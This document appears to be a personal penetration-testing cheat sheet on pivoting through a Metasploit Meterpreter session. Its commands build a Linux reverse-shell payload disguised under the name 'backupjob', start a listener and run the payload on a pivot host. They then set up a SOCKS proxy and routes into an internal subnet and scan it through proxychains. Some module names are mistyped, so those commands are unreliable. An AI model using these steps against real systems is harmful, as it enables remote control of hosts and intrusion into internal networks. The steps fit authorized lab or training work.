bg-- -
Pivot through meterpreter **not** SSH.
### Create Payload
Make a meterpreter payload that will be executed on pivot host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=9001 -f elf -o backupjob
```
Then, [[Dark Arts/File Transfer/~Home|File Transfer]] payload to pivot host
### Start Listener
```bash
msfconsole
use muli/handler
set lhost 0.0.0.0
set lport 9001
set payload linux/x64/meterpreter/reverse_tcp
run
```
### Run payload
First, [[Dark Arts/File Transfer/~Home|File Transfer]] payload to pivot host
```bash
chmod +x backupjob
./backupjob
```
### Setup MSF SOCKS Proxy
```bash
# setup
use auxiliary/server/socks_proxy
set srvport 9050
set srvhost 0.0.0.0
set version 4a
run

# confirm proxy server is running
jobs

# make sure one of the following is at the end of /etc/proxychains.conf
socks4 127.0.0.1 9050
socks5 127.0.0.1 9050

# Create routes with autoroute, either will work
use post/mulit/manage/autoroute
set session 1
set subnet 172.16.5.0
run

# alternatively, from meterpreter shell, run:
run autoroute -s 172.16.5.0/23

# confirm routes were set, from meterpreter shell:
run autorun -p
```
### Use proxychains
You can now use proxychains to send your traffic through the meterpreter session
```bash
sudo proxychains nmap 172.16.5.19 -p 3389 -sT -v -Pn
```